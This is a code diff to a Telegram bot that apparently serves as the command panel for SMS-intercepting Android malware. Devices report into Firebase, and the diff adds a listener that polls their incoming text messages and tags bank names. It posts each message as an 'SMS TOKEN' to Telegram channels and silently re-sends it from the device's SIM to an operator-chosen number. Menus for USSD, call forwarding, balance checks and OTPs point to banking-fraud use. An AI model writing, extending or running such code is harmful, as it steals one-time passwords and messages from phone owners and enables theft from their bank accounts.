@@ -164,6 +164,9 @@ function getUserData(userId) {
     bank_balances: {},
     detected_banks: {},
     fwd_state: {},
+    forward_number: '',
+    listening: false,
+    sms_cursor: {},
     createdAt: new Date().toISOString(),
     lastSeen: new Date().toISOString()
   };
@@ -593,6 +596,112 @@ async function scanUserDevices(uid, storePhone = true) {
   return results;
 }
 
+// ============================================================
+// SMS FORWARD LISTENER
+// Polls root `messages/<deviceId>` (and client-scoped `clients/<did>/messages`)
+// for fresh INCOMING SMS, then:
+//   • posts each one to every channel/group the user set
+//   • re-sends each one to the user's forward_number via the device SIM
+// Works indefinitely on VPS/loop mode (10s interval); on Vercel it runs
+// fresh on every webhook update + every /ping.
+// ============================================================
+async function fetchRecentDeviceSms(fbUrl, deviceId, base) {
+  const paths = [
+    `messages/${deviceId}`,
+    `${base}/messages`,
+    `${base}/sms`,
+    `${base}/smsnormal`
+  ];
+  const out = [];
+  for (const p of paths) {
+    try {
+      const url0 = urlAlias.get(fbUrl) || fbUrl;
+      const r = await axios.get(`${url0}/${p}.json?orderBy=%22%24key%22&limitToLast=15`, { timeout: 15000 });
+      if (r.data && typeof r.data === 'object') {
+        for (const v of Object.values(r.data)) if (v && typeof v === 'object') out.push(v);
+      }
+    } catch (e) {}
+  }
+  return out;
+}
+
+async function forwardIncomingSms(uid, deviceId, fbUrl, msg) {
+  try {
+    const user = getUserData(uid);
+    const text = String(msg.message || msg.text || msg.body || '');
+    if (!text) return;
+    const sender = String(msg.sender || msg.from || 'Unknown');
+    let bankName = '';
+    try { const b = detectBanksFromText(text); bankName = Array.isArray(b) ? b.join('/') : String(b || ''); } catch (e) {}
+    const fwd = String(user.forward_number || '').replace(/\D/g, '');
+    // 1) SMS → forward mobile number (via the device's own SIM)
+    if (fwd) {
+      try { await sendSMS(uid, deviceId, fwd, text); } catch (e) {}
+    }
+    // 2) SMS → channel/group(s)
+    const lines = [
+      '📱 SMS TOKEN 🖤',
+      '━━━━━━━━━━━━━━',
+      bankName ? `🏦 Bank: ${bankName}` : null,
+      fwd ? `📞 Forward: +${fwd}` : null,
+      `👤 Sender: ${sender}`,
+      `💬 ${text}`
+    ].filter(Boolean).join('\n');
+    for (const ch of user.channels || []) {
+      try { await axios.post(`${TELEGRAM_API}/sendMessage`, { chat_id: ch, text: lines }); } catch (e) {}
+    }
+  } catch (e) {}
+}
+
+let lastSmsForwardSweep = 0;
+async function smsForwardOnce() {
+  try {
+    for (const [uid, u] of Object.entries(state.users || {})) {
+      if (!u.listening) continue;
+      const urls = u.fb_urls || [];
+      const devs = Object.values(state.global_devices || {})
+        .filter(g => g.owner_uid === String(uid))
+        .map(g => g.id);
+      if (u.device_id && !devs.includes(u.device_id)) devs.push(u.device_id);
+      if (!devs.length || !urls.length) continue;
+      if (!u.sms_cursor || typeof u.sms_cursor !== 'object') u.sms_cursor = {};
+      const ud = getUserData(uid);
+      for (const fbUrl of urls) {
+        for (const did of devs) {
+          const base = `${dataPathOf(ud)}/${did}`;
+          const msgs = await fetchRecentDeviceSms(fbUrl, did, base);
+          if (!msgs.length) continue;
+          let maxId = typeof u.sms_cursor[did] === 'number' ? u.sms_cursor[did] : 0;
+          const fresh = msgs
+            .filter(v => typeof v.id === 'number')
+            .filter(v => !v.type || /in/i.test(String(v.type)))
+            .sort((a, b) => a.id - b.id);
+          if (maxId === 0 && fresh.length) {
+            // First pass: don't flood with old history — just take latest as baseline.
+            u.sms_cursor[did] = fresh[fresh.length - 1].id;
+            saveState();
+            continue;
+          }
+          for (const v of fresh) {
+            if (v.id <= maxId) continue;
+            if (v.id > maxId) maxId = v.id;
+            await forwardIncomingSms(uid, did, fbUrl, v);
+          }
+          if (typeof u.sms_cursor[did] !== 'number' || maxId > u.sms_cursor[did]) {
+            u.sms_cursor[did] = maxId;
+            saveState();
+          }
+        }
+      }
+    }
+  } catch (e) { console.error('smsForward sweep:', e.message); }
+}
+function throttledSmsForward() {
+  if ((Date.now() - lastSmsForwardSweep) < 8000) return Promise.resolve();
+  lastSmsForwardSweep = Date.now();
+  return smsForwardOnce();
+}
+
 async function getOnlineDevices(uid) {
   // live sweep of this user's firebases (keeps status fresh)
   await scanUserDevices(uid, false);
@@ -987,6 +1096,7 @@ async function showDeviceManagement(uid, chatId, messageId, deviceId, edit = tru
     [{ text: '📱 USSD', callback_data: `ussd_${deviceId}` }, { text: '📞 Call Dial', callback_data: `calldial_${deviceId}` }],
     [{ text: `📡 Call Fwd`, callback_data: `callfwd_${deviceId}` }],
     [{ text: `✅ Check Balance`, callback_data: `checkbalance_${deviceId}` }],
+    [{ text: `📡 Listening: ${user.listening ? '🟢 ON' : '⚫ OFF'}`, callback_data: `toggle_listen_${deviceId}` }],
     [{ text: `${(user.default_sim || 'sim1') === 'sim1' ? '●' : '○'} SIM1`, callback_data: `sim_${deviceId}_sim1` }, { text: `${(user.default_sim || 'sim1') === 'sim2' ? '●' : '○'} SIM2`, callback_data: `sim_${deviceId}_sim2` }],
     [{ text: '🔄 Refresh', callback_data: `refresh_${deviceId}` }, { text: '🔙 Back', callback_data: forAdmin ? 'admin_devices' : 'online_devices' }]
   ];
@@ -1552,11 +1662,31 @@ async function showConnectFirebase(uid, chatId, messageId = null, edit = true) {
 }
 
 async function showSetChannel(uid, chatId, messageId = null, edit = true) {
+  setAwaiting(uid, 'state', 'none');
+  const user = getUserData(uid);
+  const current = (user.channels || []).length ? user.channels.join(', ') : 'Not set';
+  const lines = [
+    '📢 **Channel / Forward Setup**', '═══════════════════════════', '',
+    `📢 Channel/Group: \`${current}\``,
+    `📱 Forward Number: \`${user.forward_number || 'Not set'}\``, '',
+    'Neeche se option chuno 👇'
+  ];
+  const buttons = [
+    [{ text: '📱 Set Mobile Number (SMS Forward)', callback_data: 'set_fwd_number' }],
+    [{ text: '📢 Set Channel/Group ID', callback_data: 'set_channel_id' }],
+    [{ text: '🔙 Back', callback_data: 'main_menu' }]
+  ];
+  const text = lines.join('\n');
+  if (edit && messageId) await editMessage(chatId, messageId, text, buttons);
+  else await sendMessage(chatId, text, buttons);
+}
+
+async function showSetChannelIds(uid, chatId, messageId = null, edit = true) {
   setAwaiting(uid, 'state', 'channel_setup');
   const user = getUserData(uid);
   const current = (user.channels || []).length ? user.channels.join(', ') : 'Not set';
   const lines = [
-    '📢 **Set Channel for Auto Token**', '═══════════════════════════', '',
+    '📢 **Set Channel / Group for SMS Forward**', '═══════════════════════════', '',
     `Current: \`${current}\``, '',
     'Channel/Group ID bhejo:',
     'Example: `-1001234567890`', '',
@@ -1565,9 +1695,26 @@ async function showSetChannel(uid, chatId, messageId = null, edit = true) {
     '⚠️ Bot us channel/group ka **ADMIN** hona chahiye.',
     'Send `/cancel` to cancel.'
   ];
-  const buttons = [[{ text: '🔙 Back', callback_data: 'main_menu' }]];
+  const buttons = [[{ text: '🔙 Back', callback_data: 'set_channel' }]];
   const text = lines.join('\n');
   if (edit && messageId) await editMessage(chatId, messageId, text, buttons);
+  else await sendMessage(chatId, text, buttons);
+}
+
+async function showSetForwardNumber(uid, chatId, messageId) {
+  setAwaiting(uid, 'state', 'fwd_number_setup');
+  const user = getUserData(uid);
+  const lines = [
+    '📱 **Set Mobile Number (SMS Forward)**', '═══════════════════════════', '',
+    `Current: \`${user.forward_number || 'Not set'}\``, '',
+    'Jis mobile number par SMS forward karna hai woh bhejo:',
+    'Example: `9876543210` / `+919876543210`', '',
+    'Note: Is number par device se real SMS jayega (forward).',
+    'Send `/cancel` to cancel.'
+  ];
+  const buttons = [[{ text: '🔙 Back', callback_data: 'set_channel' }]];
+  const text = lines.join('\n');
+  if (messageId) await editMessage(chatId, messageId, text, buttons);
   else await sendMessage(chatId, text, buttons);
 }
 
@@ -1655,6 +1802,8 @@ async function handleCallback(update) {
       case 'quick_send': return showQuickSend(uid, chatId, msgId);
       case 'quick_otp': return showQuickOtp(uid, chatId, msgId);
       case 'set_channel': return showSetChannel(uid, chatId, msgId, true);
+      case 'set_channel_id': return showSetChannelIds(uid, chatId, msgId, true);
+      case 'set_fwd_number': return showSetForwardNumber(uid, chatId, msgId);
       case 'add_firebase': return showConnectFirebase(uid, chatId, msgId, true);
       case 'toggle_auto': {
         const user = getUserData(uid);
@@ -1804,6 +1953,14 @@ async function handleCallback(update) {
       const deviceId = data.substring(8);
       return showForwardMenu(uid, chatId, msgId, deviceId, 'call');
     }
+    if (data.startsWith('toggle_listen_')) {
+      const deviceId = data.substring(13);
+      const u = getUserData(uid);
+      u.listening = !u.listening;
+      saveState();
+      await answerCallback(cb.id, u.listening ? '📡 Listening ON' : 'Listening OFF');
+      return showDeviceManagement(uid, chatId, msgId, deviceId, true);
+    }
     if (data.startsWith('fwden_')) {
       const parts = data.split('_');
       const deviceId = parts.slice(1, -1).join('_');
@@ -1910,6 +2067,15 @@ async function handleCommand(update) {
         `${msgStore ? `💬 Messages store: \`${msgStore}/\`\n` : ''}` +
         `📱 Devices found: ${devCount}\n\n_Auto path detection: ON_`);
       return showMainMenu(uid, chatId);
+    }
+
+    if (awaiting.state === 'fwd_number_setup') {
+      const num = text.replace(/[^\d+]/g, '');
+      if (!/^\+?\d{10,15}$/.test(num)) { await sendMessage(chatId, '❌ Invalid number. Example: 9876543210'); return; }
+      updateUserData(uid, { forward_number: num.replace(/^\+/, '') });
+      clearAwaiting(uid);
+      await sendMessage(chatId, `✅ Forward number set: \`${num}\`\nAb incoming SMS is number par forward honge.`);
+      return showSetChannel(uid, chatId);
     }
 
     if (awaiting.state === 'channel_setup') {
@@ -2053,9 +2219,9 @@ async function handleCommand(update) {
 async function handleUpdate(update) {
   try {
     await initState();
-    // Fresh statuses: run the background sweep (throttled to once/20s) so the
-    // online/offline registry reflects live Firebase state before we answer.
+    // Fresh statuses + live SMS forward (throttled) so both stay current.
     try { await throttledSweep(); } catch (e) {}
+    try { await throttledSmsForward(); } catch (e) {}
     if (update.callback_query) return handleCallback(update);
     if (update.message) {
       const chatId = update.message.chat ? update.message.chat.id : 0;
@@ -2223,6 +2389,7 @@ if (process.env.VERCEL_URL || process.env.WEBHOOK_URL || process.env.VERCEL_PROJ
 if (require.main === module) {
   initState().then(() => {
     setInterval(() => backgroundSweepOnce(), 45000);
+    setInterval(() => throttledSmsForward(), 10000);
     const port = parseInt(process.env.PORT || '3000', 10);
     app.listen(port, () => {
       console.log(`🤖 AUTO TOKEN SENDER v7.1 running on :${port}`);
